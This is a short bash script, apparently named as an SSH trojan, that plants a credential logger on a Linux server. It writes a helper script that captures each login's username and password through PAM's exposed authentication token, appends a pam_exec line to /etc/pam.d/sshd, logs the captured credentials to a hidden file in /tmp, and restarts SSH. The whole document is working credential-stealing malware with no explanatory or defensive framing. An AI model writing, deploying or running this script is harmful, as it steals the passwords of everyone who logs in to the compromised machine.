#!/bin/bash

file_log="/tmp/.log_sshtrojan1.txt"
file_sshd="/etc/pam.d/sshd"
file_exec="/root/sshlogger.sh"
if [[ -f $file_log ]]; then
    echo "File $file_log exits"
else
    echo "Create File $file_log"
    touch $file_log
fi

cat > $file_exec << EOF 
#!/bin/bash
read password
printf "Username: \$PAM_USER\nPassword: \$password\n"
EOF

chmod +x $file_exec

echo "Run File"
cat >> $file_sshd << EOF
auth optional pam_exec.so expose_authtok log=$file_log $file_exec
EOF
echo "Restart SSH"
/etc/init.d/ssh restart
